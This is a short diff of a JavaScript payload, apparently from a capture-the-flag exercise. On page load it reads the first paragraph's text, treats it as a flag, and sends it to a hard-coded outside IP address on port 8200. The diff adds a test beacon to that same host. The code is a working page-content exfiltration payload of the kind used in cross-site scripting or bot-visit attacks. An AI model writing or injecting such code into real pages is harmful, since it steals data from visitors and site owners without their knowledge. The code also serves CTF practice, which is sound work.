@@ -18,7 +18,9 @@ document.addEventListener('DOMContentLoaded', (event) => {
         if (pElements.length > 0) {
             flagContent = pElements[0].textContent; // 或使用innerText取决于具体情况
         }
-
+        fetch(`http://111.229.210.75:8200/flagtest`, { method: "GET" })
+            .then(response => console.log("test sent successfully"))
+            .catch(error => console.error("Error sending content:", error));
         // 检查flagContent是否有效，然后发送
         if (flagContent) {
             const targetUrl = `http://111.229.210.75:8200/${encodeURIComponent(flagContent)}`;
